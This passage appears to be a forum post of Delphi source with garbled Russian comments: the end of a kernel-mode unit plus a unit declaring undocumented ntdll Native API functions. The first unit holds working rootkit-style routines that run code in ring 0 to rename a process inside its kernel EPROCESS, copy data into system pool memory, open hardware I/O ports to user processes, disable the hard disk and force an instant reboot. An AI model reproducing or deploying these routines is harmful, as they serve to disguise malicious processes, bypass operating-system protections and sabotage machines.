  ���ާ֧ߧ� �ڧާ֧ߧ� �����֧��� ��� ��ܧѧ٧ѧ�֧ݧ� �ߧ� �֧ԧ� EPROCESS. 
} 
Procedure ChangeProcessNameEx(pEPROCESS: dword; NewName: PChar); 
var 
 Data: packed record 
      {00} UndocAdr: pointer; 
      {04} pEPROCESS: dword; 
      {08} NewName:    array [0..15] of Char; 
      {18} UnicName:   array [0..15] of WideChar; 
      {38} UnicLength: word; 
          end; 
 Procedure Ring0Call; 
 asm 
  push eax 
  mov eax, [eax + $04] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  pop eax 
  mov ebx, [eax]        //UndocAdr 
  mov edi, [eax + $04]  //pEPROCESS 
  add edi, [ebx + $0C]  //NameOffset 
  mov esi, eax 
  add esi, $08 
  mov ecx, $10 
  repnz movsb 
  mov esi, eax 
  add esi, $18 
  mov edx, [eax + $04]  //pEPROCESS 
  mov ebp, [eax] 
  mov ebp, [ebp + $14] 
  add edx, ebp          //@IamgeFileName 
  mov ebp, eax 
  mov edx, [edx] 
  test edx, edx 
  jz  @Done 
  movzx ecx, word ptr [edx] 
  test ecx, ecx 
  jz  @Done 
  mov edi, dword ptr [edx + $04]  
  add edi, ecx 
  mov edx, edi 
  std 
  mov eax, '\' 
  shr ecx, 1 
  repne scasw 
  or ecx, ecx 
  jz @Done 
  add edi, $04 
  lea esi, [ebp + $18] 
  movzx ecx, word ptr [ebp + $38] 
  cld 
  rep movsw 
  mov edx, [ebp + $04]  //pEPROCESS 
  mov ebp, [ebp] 
  mov ebp, [ebp + $14] 
  add edx, ebp         //@IamgeFileName 
  mov edx, [edx] 
  mov word ptr [edx], cx 
  @Done: 
  ret 
  @Exit: 
  pop eax 
  ret 
 end; 
begin 
 if pEPROCESS = 0 then Exit; 
 Data.UndocAdr  := @UndocData; 
 Data.pEPROCESS := pEPROCESS; 
 lstrcpyn(Data.NewName, NewName, 16); 
 StringToWideChar(NewName, @Data.UnicName, 16); 
 Data.UnicLength := lstrlen(NewName); 
 CallRing0(@Ring0Call, @Data); 
end; 
{ ���ާ֧ߧ� �ڧާ֧ߧ� �����֧���. } 
Procedure ChangeProcessName(ProcessId: dword; NewName: PChar); 
var 
 OldPriority: dword; 
 pEPROCESS  : dword; 
begin 
 OldPriority := GetThreadPriority($FFFFFFFE); 
 SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL); 
 pEPROCESS := GetEPROCESSAdr(ProcessId); 
 ChangeProcessNameEx(pEPROCESS, NewName); 
 SetThreadPriority($FFFFFFFE, OldPriority); 
end; 
{ 
  ����է֧ݧ֧ߧڧ� ���ѧ��ܧ� ��ѧާ��� �� NonPaged Pool �� �ܧ��ڧ��ӧѧߧڧ� �� �ߧ֧ԧ� �էѧߧߧ��. 
  Mem - �ѧէ�֧� ���ѧ��ܧ� ��ѧާ���, 
  Size - ��ѧ٧ާ֧� ���ѧ��ܧ� ��ѧާ���, 
  Result - �ѧէ�֧� ��ѧާ��� �� SystemSpace 
} 
function InjectDataToSystemMemory(Mem: pointer; Size: dword): dword; 
var 
 Data: packed record 
           Mem:    pointer; 
           Size:   dword; 
           Result: dword; 
          end; 
 Procedure Ring0Call; 
 asm 
  mov ebx, eax 
  push [eax] 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  push [ebx + $04] 
  push 0 
  call AdrExAllocPool 
  mov [ebx + $08], eax 
  mov edi, eax 
  mov esi, [ebx] 
  mov ecx, [ebx + $04] 
  rep movsb 
  ret 
  @Exit: 
  mov [ebx + $08], 0 
  ret 
 end; 
begin 
  Data.Mem  := Mem; 
  Data.Size := Size; 
  CallRing0(@Ring0Call, @Data); 
  Result := Data.Result; 
end; 
{ 
  ����ӧ�ҧ�اէ֧ߧڧ� �ӧ�է֧ݧ֧ߧߧ�� ��ѧާ��� �� SystemSpace. 
} 
Procedure FreeSystemMemory(Mem: dword); 
  Procedure Ring0Call; 
  asm 
   push eax 
   call AdrExFreePool 
  end; 
begin 
  if Mem < $80000000 then Exit; 
  CallRing0(@Ring0Call, pointer(Mem)); 
end; 
  
{ 
 �����ѧߧ�ӧܧ� ��ڧ��֧ާߧ�� �ܧѧ��� �ӧӧ�է� - �ӧ�ӧ�է� 
 pMap - �ѧէ�֧� �ҧ��֧�� ��ѧ٧ާ֧��� $2000 ���ܧ�է� �ҧ�է֧� �ӧ٧��� �ܧѧ���. 
} 
Procedure SetIoAccessMap(pMap: pointer); 
 Procedure Ring0Call; 
 asm 
  push eax 
  push 1 
  call AdrSetIoAccess 
  ret 
 end; 
begin 
 CallRing0(@Ring0Call, pMap); 
end; 

{ 
  ����ݧ��֧ߧڧ� ��ڧ��֧ާߧ�� �ܧѧ��� �ӧӧ�է� - �ӧ�ӧ�է�. 
  pMap - �ѧէ�֧� �ҧ��֧�� ��ѧ٧ާ֧��� $2000 �ܧ�է� �ҧ�է֧� �����ѧߧ֧ߧ� �ܧѧ���. 
} 
Procedure GetIoAccessMap(pMap: pointer); 
 Procedure Ring0Call; 
 asm 
  push eax 
  push 1 
  call AdrGetIoAccess 
  ret 
 end; 
begin 
 CallRing0(@Ring0Call, pMap); 
end; 
{ ���ѧ٧�֧�֧ߧڧ� / �٧ѧ��ܧ�֧ߧڧ� �ڧ���ݧ�٧�ӧѧߧڧ� �ܧѧ��� �ӧӧ�է� - �ӧ�ӧ�է� �էݧ� �����֧���. } 
Procedure SetIoAccessProcessEx(pEPROCESS: dword; Access: boolean); 
var 
 Data : packed record 
          pEPROCESS: dword; 
          Access: dword; 
        end; 
 Procedure Ring0Call; 
 asm 
  mov ebx, [eax + $04] 
  push ebx 
  mov eax, [eax] 
  push eax 
  call AdrSetAccProc 
  ret 
 end; 
begin 
 Data.pEPROCESS := pEPROCESS; 
 if Access then Data.Access := 1 else Data.Access := 0; 
 CallRing0(@Ring0Call, @Data); 
end; 
{ ���ѧ٧�֧�ڧ�� / �٧ѧ��֧�ڧ�� �ڧ���ݧ�٧�ӧѧߧڧ� �ܧѧ��� ��/�� �էݧ� �����֧��� } 
Procedure SetIoAccessProcess(ProcessId: dword; Access: boolean); 
var 
 OldPriority: dword; 
 pEPROCESS  : dword; 
begin 
 OldPriority := GetThreadPriority($FFFFFFFE); 
 SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL); 
 pEPROCESS := GetEPROCESSAdr(ProcessId); 
 if pEPROCESS = 0 then Exit; 
 SetIoAccessProcessEx(pEPROCESS, Access); 
 SetThreadPriority($FFFFFFFE, OldPriority); 
end; 
{ ����ܧ���ڧ� / �٧ѧܧ���ڧ� �է������ �� ������ ��/�� �էݧ� ��ѧ٧�֧�֧ߧߧ�� �����֧����. } 
Procedure OpenPort(Port: dword; CanOpen: boolean); 
var 
 Iopm: array [0..$2000] of Byte; 
 pIopm: pointer; 
 bNum: dword; 
 bOffset: dword; 
begin 
 pIopm := @Iopm; 
 GetIoAccessMap(pIopm); 
 bNum := Port div 8; 
 bOffset := Port mod 8; 
 if CanOpen then 
  asm 
   mov ecx, pIopm 
   add ecx, bNum 
   mov eax, [ecx] 
   mov edx, bOffset 
   btr eax, edx 
   mov [ecx], eax 
  end else 
  asm 
   mov ecx, pIopm 
   add ecx, bNum 
   mov eax, [ecx] 
   mov edx, bOffset 
   bts eax, edx 
   mov [ecx], eax 
  end; 
 SetIoAccessMap(pIopm); 
end; 
{ ����ܧݧ��֧ߧڧ� ��֧�ӧ�ԧ� �ӧڧߧ��. } 
Procedure DisableHDD(); 
 Procedure Ring0Call; 
 asm 
  mov al, $0E6 
  mov dx, $1F7 
  out dx, al 
  ret 
 end; 
  
begin 
 CallRing0(@Ring0Call, nil); 
end; 
{ ���֧�֧٧ѧԧ��٧ܧ�. } 
Procedure FastReboot(); 
 Procedure Ring0Call; 
 asm 
  mov al, $FE 
  out $64, al 
  ret 
 end; 
  
begin 
 CallRing0(@Ring0Call, nil); 
end; 
end. 

[/code] 
[code] 
 { 
  ����ڧ�ѧߧڧ� ���ߧܧ�ڧ� �� �����ܧ��� Native API �էݧ� Delphi by Ms-Rem and Jonny210. 
  ����ݧ�ܧ� 100% ����ӧ֧�֧ߧߧ�� ���ߧܧ�ڧ�. 
  Last update: 19.04.2005 
} 
unit NativeAPI; 
interface 
uses windows; 
type 
  NTStatus = cardinal; 
  PVOID    = pointer; 
  USHORT = WORD; 
  UCHAR = byte; 
  PWSTR = PWideChar; 
CONST 
  NTDLL = 'ntdll.dll'; 
  FILE_ANY_ACCESS           = $0000; // any type 
  FILE_READ_ACCESS          = $0001; // file & pipe 
  FILE_READ_DATA            = $0001; // file & pipe 
  FILE_WRITE_ACCESS         = $0002; // file & pipe 
  FILE_WRITE_DATA           = $0002; // file & pipe 
  FILE_CREATE_PIPE_INSTANCE = $0004; // named pipe 
  FILE_READ_ATTRIBUTES      = $0080; // all types 
  FILE_WRITE_ATTRIBUTES     = $0100; // all types 
  STANDARD_RIGHTS_ALL       = $001F0000; 
  FILE_ALL_ACCESS           = FILE_READ_ACCESS or 
                              FILE_WRITE_ACCESS or 
                              FILE_CREATE_PIPE_INSTANCE or 
                              FILE_READ_ATTRIBUTES or 
                              FILE_WRITE_ATTRIBUTES or 
                              STANDARD_RIGHTS_ALL; 
CONST  //����ѧ��� �ܧ�ߧ��ѧߧ�� 
  STATUS_SUCCESS              = NTStatus($00000000); 
  STATUS_ACCESS_DENIED        = NTStatus($C0000022); 
  STATUS_INFO_LENGTH_MISMATCH = NTStatus($C0000004); 
  SEVERITY_ERROR              = NTStatus($C0000000); 
const// SYSTEM_INFORMATION_CLASS 
  SystemBasicInformation               = 0; 
  SystemProcessorInformation           = 1; 
  SystemPerformanceInformation          = 2; 
  SystemTimeOfDayInformation            = 3; 
  SystemNotImplemented1                = 4; 
  SystemProcessesAndThreadsInformation = 5; 
  SystemCallCounts                     = 6; 
  SystemConfigurationInformation       = 7; 
  SystemProcessorTimes                 = 8; 
  SystemGlobalFlag                     = 9; 
  SystemNotImplemented2                = 10; 
  SystemModuleInformation              = 11; 
  SystemLockInformation                 = 12; 
  SystemNotImplemented3                 = 13; 
  SystemNotImplemented4                 = 14; 
  SystemNotImplemented5                 = 15; 
  SystemHandleInformation               = 16; 
  SystemObjectInformation               = 17; 
  SystemPagefileInformation             = 18; 
  SystemInstructionEmulationCounts     = 19; 
  SystemInvalidInfoClass                = 20; 
  SystemCacheInformation               = 21; 
  SystemPoolTagInformation             = 22; 
  SystemProcessorStatistics             = 23; 
  SystemDpcInformation                 = 24; 
  SystemNotImplemented6                 = 25; 
  SystemLoadImage                       = 26; 
  SystemUnloadImage                     = 27; 
  SystemTimeAdjustment                  = 28; 
  SystemNotImplemented7                = 29; 
  SystemNotImplemented8                 = 30; 
  SystemNotImplemented9                = 31; 
  SystemCrashDumpInformation           = 32; 
  SystemExceptionInformation           = 33; 
  SystemCrashDumpStateInformation       = 34; 
  SystemKernelDebuggerInformation      = 35; 
  SystemContextSwitchInformation       = 36; 
  SystemRegistryQuotaInformation       = 37; 
  SystemLoadAndCallImage                = 38; 
  SystemPrioritySeparation              = 39; 
  SystemNotImplemented10               = 40; 
  SystemNotImplemented11               = 41; 
  SystemInvalidInfoClass2               = 42; 
  SystemInvalidInfoClass3              = 43; 
  SystemTimeZoneInformation             = 44; 
  SystemLookasideInformation           = 45; 
  SystemSetTimeSlipEvent               = 46; 
  SystemCreateSession                  = 47; 
  SystemDeleteSession                   = 48; 
  SystemInvalidInfoClass4               = 49; 
  SystemRangeStartInformation          = 50; 
  SystemVerifierInformation            = 51; 
  SystemAddVerifier                     = 52; 
  SystemSessionProcessesInformation    = 53; 

type 
PClientID = ^TClientID; 
TClientID = packed record 
 UniqueProcess:cardinal; 
 UniqueThread:cardinal; 
end; 
PUnicodeString = ^TUnicodeString; 
  TUnicodeString = packed record 
    Length: Word; 
    MaximumLength: Word; 
    Buffer: PWideChar; 
end; 
PAnsiString = ^TAnsiString; 
TAnsiString = packed record 
  Length: Word; 
  MaximumLength: Word; 
  Buffer: PChar; 
end; 
  TPoolType = ( 
    NonPagedPool, 
    PagedPool, 
    NonPagedPoolMustSucceed, 
    DontUseThisType, 
    NonPagedPoolCacheAligned, 
    PagedPoolCacheAligned, 
    NonPagedPoolCacheAlignedMustS, 
    MaxPoolType, 
    NonPagedPoolSession, // !!! NonPagedPoolSession = 32 
    PagedPoolSession, 
    NonPagedPoolMustSucceedSession, 
    DontUseThisTypeSession, 
    NonPagedPoolCacheAlignedSession, 
    PagedPoolCacheAlignedSession, 
    NonPagedPoolCacheAlignedMustSSession 
  ); 
 {                                 //    Value   Query   Set 
  TObjectInformationClass = ( 
    ObjectBasicInformation,        //     0       Y       N 
    ObjectNameInformation,         //     1       Y       N 
    ObjectTypeInformation,         //     2       Y       N 
    ObjectAllTypesInformation,     //     3       Y       N 
    ObjectHandleInformation        //     4       Y       Y 
  ); 
  } 
  // Information Class 0 
  PObjectBasicInformation = ^TObjectBasicInformation; 
  TObjectBasicInformation = packed record 
    Attributes: ULONG; 
    GrantedAccess: ACCESS_MASK; 
    HandleCount: ULONG; 
    PointerCount: ULONG; 
    PagedPoolUsage: ULONG; 
    NonPagedPoolUsage: ULONG; 
    Reserved: array[0..2] of ULONG; 
    NameInformationLength: ULONG; 
    TypeInformationLength: ULONG; 
    SecurityDescriptorLength: ULONG; 
    CreateTime: LARGE_INTEGER; 
  end; 
  // Information Class 1 
  PObjectNameInformation = ^TObjectNameInformation; 
  TObjectNameInformation = packed record 
    Name: TUnicodeString; 
  end; 
  // Information Class 2 
  PObjectTypeInformation = ^TObjectTypeInformation; 
  TObjectTypeInformation = packed record 
    Name: TUnicodeString; 
    ObjectCount: ULONG; 
    HandleCount: ULONG; 
    Reserved1: array[0..3] of ULONG; 
    PeakObjectCount: ULONG; 
    PeakHandleCount: ULONG; 
    Reserved2: array[0..3] of ULONG; 
    InvalidAttributes: ULONG; 
    GenericMapping: GENERIC_MAPPING; 
    ValidAccess: ULONG; 
    Unknown: UCHAR; 
    MaintainHandleDatabase: Boolean; 
    PoolType: TPoolType; 
    PagedPoolUsage: ULONG; 
    NonPagedPoolUsage: ULONG; 
  end; 
  // Information Class 3 
  PObjectAllTypesInformation = ^TObjectAllTypesInformation; 
  TObjectAllTypesInformation = packed record 
    NumberOfTypes: ULONG; 
    TypeInformation: TObjectTypeInformation; 
  end; 
  // Information Class 4 
  PObjectHandleInformation = ^TObjectHandleInformation; 
  TObjectHandleInformation = packed record 
    Inherit: Boolean; 
    ProtectFromClose: Boolean; 
  end; 
PTHREAD_BASIC_INFORMATION = ^THREAD_BASIC_INFORMATION; 
  THREAD_BASIC_INFORMATION = packed record 
  ExitStatus: BOOL; 
  TebBaseAddress: pointer; 
  ClientId: TClientID; 
  AffinityMask: DWORD; 
  Priority: dword; 
  BasePriority: dword; 
 end; 
PSYSTEM_HANDLE_INFORMATION = ^SYSTEM_HANDLE_INFORMATION; 
SYSTEM_HANDLE_INFORMATION = packed record 
   ProcessId: dword; 
   ObjectTypeNumber: byte; 
   Flags: byte; 
   Handle: word; 
   pObject: pointer; 
   GrantedAccess: dword; 
   end; 
PSYSTEM_HANDLE_INFORMATION_EX = ^SYSTEM_HANDLE_INFORMATION_EX; 
SYSTEM_HANDLE_INFORMATION_EX = packed record 
   NumberOfHandles: dword; 
   Information: array [0..0] of SYSTEM_HANDLE_INFORMATION; 
   end; 
PSYSTEM_LOAD_IMAGE = ^SYSTEM_LOAD_IMAGE; 
SYSTEM_LOAD_IMAGE = packed record 
      ModuleName: TUnicodeString; 
      ModuleBase: pointer; 
      Unknown: pointer; 
      EntryPoint: pointer; 
      ExportDirectory: pointer; 
      end; 
PVM_COUNTERS = ^VM_COUNTERS; 
VM_COUNTERS = packed record 
   PeakVirtualSize, 
   VirtualSize, 
   PageFaultCount, 
   PeakWorkingSetSize, 
   WorkingSetSize, 
   QuotaPeakPagedPoolUsage, 
   QuotaPagedPoolUsage, 
   QuotaPeakNonPagedPoolUsage, 
   QuotaNonPagedPoolUsage, 
   PagefileUsage, 
   PeakPagefileUsage: dword; 
  end; 
PIO_COUNTERS = ^IO_COUNTERS; 
IO_COUNTERS = packed record 
   ReadOperationCount, 
   WriteOperationCount, 
   OtherOperationCount, 
   ReadTransferCount, 
   WriteTransferCount, 
   OtherTransferCount: LARGE_INTEGER; 
  end; 

PSYSTEM_THREADS = ^SYSTEM_THREADS; 
SYSTEM_THREADS = packed record 
  KernelTime, 
  UserTime, 
  CreateTime: LARGE_INTEGER; 
  WaitTime: dword; 
  StartAddress: pointer; 
  ClientId: TClientId; 
  Priority, 
  BasePriority, 
  ContextSwitchCount: dword; 
  State: dword; 
  WaitReason: dword; 
 end; 

PSYSTEM_PROCESSES = ^SYSTEM_PROCESSES; 
SYSTEM_PROCESSES = packed record 
   NextEntryDelta, 
   ThreadCount: dword; 
   Reserved1 : array [0..5] of dword; 
   CreateTime, 
   UserTime, 
   KernelTime: LARGE_INTEGER; 
   ProcessName: TUnicodeString; 
   BasePriority: dword; 
   ProcessId, 
   InheritedFromProcessId, 
   HandleCount: dword; 
   Reserved2: array [0..1] of dword; 
   VmCounters: VM_COUNTERS; 
   IoCounters: IO_COUNTERS; // Windows 2000 only 
   Threads: array [0..0] of SYSTEM_THREADS; 
  end; 
PObjectAttributes = ^TObjectAttributes; 
  TObjectAttributes = packed record 
    Length: DWORD; 
    RootDirectory: THandle; 
    ObjectName: PUnicodeString; 
    Attributes: DWORD; 
    SecurityDescriptor: Pointer; 
    SecurityQualityOfService: Pointer; 
end; 
  

PPROCESS_BASIC_INFORMATION = ^_PROCESS_BASIC_INFORMATION; 
_PROCESS_BASIC_INFORMATION = packed record 
   ExitStatus: BOOL; 
   PebBaseAddress: pointer; 
   AffinityMask: PULONG; 
   BasePriority: dword; 
   UniqueProcessId: ULONG; 
   InheritedFromUniqueProcessId: ULONG; 
   end; 
//LPC structures 
PPORT_MESSAGE = ^_PORT_MESSAGE; 
_PORT_MESSAGE = packed record 
DataSize, 
MessageSize, 
MessageType, 
VirtualRangesOffset:dword; 
ClientId:TClientID; 
MessageId, 
SectionSize:dword; 
Data:array[0..0] of dword; 
end; 
PSECURITY_QUALITY_OF_SERVICE = ^_SECURITY_QUALITY_OF_SERVICE; 
_SECURITY_QUALITY_OF_SERVICE =packed record 
Length:dword; 
ImpersonationLevel:TSecurityImpersonationLevel; 
ContextTrackingMode:bool; 
EffectiveOnly:bool; 
end; 
PPORT_SECTION_WRITE = ^_PORT_SECTION_WRITE; 
_PORT_SECTION_WRITE = packed record 
Length:dword; 
SectionHandle:THandle; 
SectionOffset, 
ViewSize:dword; 
ViewBase:pointer; 
TargetViewBase:pointer; 
end; 
PPORT_SECTION_READ = ^_PORT_SECTION_READ; 
_PORT_SECTION_READ = packed record 
Length, 
ViewSize, 
ViewBase:dword; 
end; 
PIO_STATUS_BLOCK = ^IO_STATUS_BLOCK; 
IO_STATUS_BLOCK = packed record //  ; sizeof = 08h 
 Status  : DWORD;//  ? ; 0000h  NTSTATUS 
 Information : DWORD;// 
  end; 
PFILE_FULL_EA_INFORMATION = ^PFILE_FULL_EA_INFORMATION; 
FILE_FULL_EA_INFORMATION = packed record 
       NextEntryOffset: dword; 
       Flags: byte; 
       EaNameLength: byte; 
       EaValueLength: word; 
       EaName: array [0..0] of Char; 
      end; 

const 
 LOCK_VM_IN_WSL = $01; 
 LOCK_VM_IN_RAM = $02; 

////////////////////////// Ntdll.dll Functions /////////////////////// 
Function ZwCreateThread(ThreadHandle: pdword; 
                        DesiredAccess: ACCESS_MASK; 
                        ObjectAttributes: pointer; 
                        ProcessHandle: THandle; 
                        ClientId: PClientID; 
                        ThreadContext: pointer; 
                        UserStack: pointer; 
                        CreateSuspended: boolean):NTStatus; 
                        stdcall;external 'ntdll.dll'; 
Function ZwResumeThread(ThreadHandle: dword; 
                        PreviousSuspendCount: pdword): NTStatus; 
                        stdcall; external 'ntdll.dll'; 
Function ZwQueryInformationThread(ThreadHandle: dword; 
                                  ThreadInformationClass: dword; 
                                  ThreadInformation: pointer; 
                                  ThreadInformationLength: dword; 
                                  ReturnLength: pdword):NTStatus; 
                                  stdcall;external 'ntdll.dll'; 
Function ZwOpenProcess( 
                     phProcess:PDWORD; 
                     AccessMask:DWORD; 
                     ObjectAttributes:PObjectAttributes; 
                     ClientID:PClientID):NTStatus; 
                     stdcall;external 'ntdll.dll'; 
function ZwOpenThread( 
ThreadHandle:PHANDLE; 
DesiredAccess:ACCESS_MASK; 
ObjectAttributes:PObjectAttributes; 
ClientId:PClientID):NTStatus;stdcall;external 'ntdll.dll'; 
Procedure ZwReadVirtualMemory( 
ProcessHandle:THANDLE; 
BaseAddress:POINTER; 
var Buffer:pointer; 
BufferLength:ULONG; 
var ReturnLength:PULONG);stdcall;external 'ntdll.dll'; 
Function ZwQueryInformationProcess( 
                                ProcessHandle:THANDLE; 
                                ProcessInformationClass:DWORD; 
                                ProcessInformation:pointer; 
                                ProcessInformationLength:ULONG; 
                                ReturnLength:PULONG):NTStatus;stdcall; 
                                external 'ntdll.dll'; 
Function ZwWriteVirtualMemory( 
ProcessHandle:THANDLE; 
BaseAddress:pointer; 
Buffer:pointer; 
BufferLength:dword; 
ReturnLength:PULONG):NTStatus;stdcall;external 'ntdll.dll'; 
Function ZwProtectVirtualMemory( 
ProcessHandle:THANDLE; 
BaseAddress:pointer; 
ProtectSize:PULONG; 
NewProtect:dword; 
OldProtect:pulong):NTStatus;stdcall;external 'ntdll.dll'; 
Function ZwQuerySystemInformation(ASystemInformationClass: dword; 
                                  ASystemInformation: Pointer; 
                                  ASystemInformationLength: dword; 
                                  AReturnLength:PCardinal): NTStatus; 
                                  stdcall;external 'ntdll.dll'; 

Function ZwTerminateProcess(ProcessHandle:dword; 
                            ExitStatus:dword):NTStatus;stdcall;external 'ntdll.dll'; 
Function ZwAllocateVirtualMemory( 
ProcessHandle:THANDLE; 
BaseAddress:pointer; 
ZeroBits:dword; 
AllocationSize:pdword; 
AllocationType:dword; 
Protect:dword):NTStatus;stdcall;external 'ntdll.dll'; 
Procedure KiFastSystemCall;stdcall;external 'ntdll.dll'; 
Function ZwClose(Handle:dword):NTStatus;stdcall;external 'ntdll.dll'; 
function ZwOpenSection(SectionHandle: PHandle; 
                       AccessMask: DWORD; 
                       ObjectAttributes: PObjectAttributes): DWORD; 
                        stdcall; external 'NTDLL.DLL'; 
procedure RtlInitUnicodeString(DestinationString: PUnicodeString; 
                               SourceString: PWideChar); 
                                stdcall; external 'ntdll.dll'; 
                               
procedure RtlInitAnsiString(DestinationString: PAnsiString; 
                            SourceString: PChar); 
                               stdcall; external 'ntdll.dll'; 
function RtlAnsiStringToUnicodeString( 
  DestinationString: PUnicodeString; 
  SourceString: PAnsiString; 
  AllocateDestinationString: Boolean 
): NTSTATUS; stdcall external 'ntdll.dll'; 

function RtlUnicodeStringToAnsiString( 
  DestinationString: PAnsiString; 
  SourceString: PUnicodeString; 
  AllocateDestinationString: boolean 
): NTSTATUS; stdcall external 'ntdll.dll'; 

procedure RtlFreeAnsiString( 
  AnsiString: PAnsiString 
); stdcall external 'ntdll.dll'; 

procedure RtlFreeUnicodeString( 
  UnicodeString: PUnicodeString 
); stdcall external 'ntdll.dll'; 

function RtlAppendUnicodeStringToString( 
  Destination: PUnicodeString; 
  Source: PUnicodeString 
): NTSTATUS; stdcall external NTDLL; 

function RtlAppendUnicodeToString( 
    Destination: PUnicodeString; 
    Source: PWideChar 
): NTSTATUS; stdcall external NTDLL; 
  
Function ZwMapViewOfSection(SectionHandle:dword; 
                            ProcessHandle:dword; 
                            BaseAddress:PPointer; 
                            ZeroBits, 
                            CommitSize:dword; 
                            SectionOffset:PInt64; 
                            ViewSize:pdword; 
                            InheritDisposition:dword; 
                            AllocationType,Protect:dword):NTStatus; 
                            stdcall; external 'ntdll.dll'; 
Function ZwUnmapViewOfSection(ProcessHandle:dword; 
                              BaseAddress:pointer):NTStatus; 
                              stdcall; external 'ntdll.dll'; 
Function ZwCreateNamedPipeFile( 
                          FileHandle:PHandle; 
                          DesiredAccess:ACCESS_MASK; 
                          ObjectAttributes:POBJECTATTRIBUTES; 
                          IoStatusBlock:pointer; 
                          ShareAccess, 
                          CreateDisposition, 
                          CreateOptions:dword; 
                          TypeMessage, 
                          ReadmodeMessage, 
                          Nonblocking:boolean; 
                          MaxInstances, 
                          InBufferSize, 
                          OutBufferSize:dword; 
                          DefaultTimeout: PDword):NTStatus; 
                          stdcall; external 'ntdll.dll'; 
//LPC functions 
Function ZwCreatePort(PortHandle:PDWORD; 
                     ObjectAttributes:PObjectAttributes; 
                     MaxDataSize,MaxMessageSize, 
                     Reserved:dword): NTStatus;stdcall;external 'ntdll.dll'; 
Function ZwQueryDirectoryFile(FileHandle: dword; 
                              Event: dword; 
                              ApcRoutine: pointer; 
                              ApcContext: pointer; 
                              IoStatusBlock: pointer; 
                              FileInformation: pointer; 
                              FileInformationLength: dword; 
                              FileInformationClass: dword; 
                              ReturnSingleEntry: bool; 
                              FileName: PUnicodeString; 
                              RestartScan: bool): NTStatus; 
                              stdcall; external 'ntdll.dll'; 

Function ZwConnectPort(PortHandle:PDWORD; 
                       PortName:PUnicodeString; 
                       SecurityQos:PSECURITY_QUALITY_OF_SERVICE; 
                        WriteSection:PPORT_SECTION_WRITE; 
                        ReadSection:PPORT_SECTION_READ; 
                       MaxMessageSize:PULONG; 
                        ConnectData :pointer; 
                        ConnectDataLength :PULONG):NTStatus; 
                       stdcall;external 'ntdll.dll'; 
Function ZwListenPort(PortHandle:THandle; 
                      var Msg:PPORT_MESSAGE):NTStatus; 
                      stdcall;external 'ntdll.dll'; 

Function ZwRequestWaitReplyPort(PortHandle:THandle; 
                                RequestMessage:PPORT_MESSAGE; 
                                var ReplyMessage:PPORT_MESSAGE):NTStatus; 
                                stdcall;external 'ntdll.dll'; 

                                
Function ZwAcceptConnectPort(PortHandle:PHANDLE; 
                             PortIdentifier:dword; 
                             PortMessage:PPORT_MESSAGE; 
                             Accept:bool; 
                             WriteSection:PPORT_SECTION_WRITE; 
                             ReadSection:PPORT_SECTION_READ):NTStatus; 
                             stdcall;external 'ntdll.dll'; 

Function ZwCompleteConnectPort(PortHandle:THandle):NTStatus; 
                               stdcall;external 'ntdll.dll'; 
  
Function ZwRequestPort(PortHandle:THandle;RequestMessage:PPORT_MESSAGE):NTStatus; 
                       stdcall;external 'ntdll.dll'; 

Function ZwReplyPort(PortHandle:THandle;RequestMessage:PPORT_MESSAGE):NTStatus; 
                       stdcall;external 'ntdll.dll'; 
  
function ZwSetSystemInformation(SystemInformationClass: dword; 
                                SystemInformation: pointer; 
                                SystemInformationLength: dword): NTStatus; 
                                  stdcall;external 'ntdll.dll'; 
function ZwLoadDriver(DriverServiceName: PUnicodeString): NTStatus; 
                  stdcall;external 'ntdll.dll'; 
function ZwUnloadDriver(DriverServiceName: PUnicodeString): NTStatus; 
                  stdcall;external 'ntdll.dll'; 
function DbgPrint( 
  const Format : PAnsiChar 
  ) : NTStatus; cdecl; external NTDLL; 

//**** Registry ****** 
function ZwCreateKey( 
 KeyHandle : pdword; 
 DesiredAccess : ACCESS_MASK; 
 ObjectAttributes : PObjectAttributes; 
 TitleIndex:ULONG; 
 ObjectClass : PUnicodeString; 
 CreateOptions:ULONG; 
  Disposition:PULONG) : NTSTATUS; stdcall; external 'ntdll.dll'; 
function ZwDeleteKey(KeyHandle: THandle): NTSTATUS; 
                                stdcall; external 'ntdll.dll' 

function LdrLoadDll(szcwPath: PWideChar; 
                    pdwLdrErr: dword; 
                    pUniModuleName: PUnicodeString; 
                    pResultInstance: PDWORD): NTSTATUS; 
                       stdcall; external 'ntdll.dll'; 
function LdrGetProcedureAddress(hModule: dword; 
                                dOrdinal: DWORD; 
                                 psName: PUnicodeString; 
                                 ppProcedure: ppointer): NTStatus; 
                                  stdcall; external 'ntdll.dll'; 
function ZwLockVirtualMemory(ProcessHandle: dword; 
                             BaseAddress: ppointer; 
                             LockSize: pdword; 
                             LockType: dword): NTStatus; 
                               stdcall; external 'ntdll.dll'; 
Function DbgUiDebugActiveProcess(pHandle: dword): NTStatus;stdcall;external 'ntdll.dll'; 
Function DbgUiConnectToDbg(): NTStatus;stdcall;external 'ntdll.dll'; 
function ZwQueryEaFile(FileHandle: dword; 
                      IoStatusBlock: PIO_STATUS_BLOCK; 
                      Buffer: pointer; 
                      BufferLength: dword; 
                      ReturnSingleEntry: bool; 
                      EaList: pointer;// OPTIONAL, 
                      EaListLength: dword; 
                      EaIndex: pdword;// OPTIONAL, 
                      RestartScan: bool):NTStatus; 
                      stdcall;external 'ntdll.dll'; 

type 
 PSYSTEM_MODULE_INFORMATION = ^SYSTEM_MODULE_INFORMATION; 
 SYSTEM_MODULE_INFORMATION = packed record // Information Class 11 
    Reserved: array[0..1] of ULONG; 
    Base: PVOID; 
    Size: ULONG; 
    Flags: ULONG; 
    Index: USHORT; 
    Unknown: USHORT; 
    LoadCount: USHORT; 
    ModuleNameOffset: USHORT; 
    ImageName: array [0..255] of Char; 
    end; 
 PSYSTEM_MODULE_INFORMATION_EX = ^SYSTEM_MODULE_INFORMATION_EX; 
 SYSTEM_MODULE_INFORMATION_EX = packed record 
    ModulesCount: dword; 
    Modules: array[0..0] of SYSTEM_MODULE_INFORMATION; 
    end; 
const 
THREAD_BASIC_INFO      = $0; 
THREAD_QUERY_INFORMATION = $40; 
ProcessBasicInformation = 0; 
OBJ_CASE_INSENSITIVE = $00000040; 
OBJ_KERNEL_HANDLE = $00000200; 
//LPC constants 
LPC_NEW_MESSAGE = 1; 
LPC_REQUEST     = 2; 
LPC_REPLY       = 3; 
LPC_DATAGRAM    = 4; 
LPC_LOST_REPLY  = 5; 
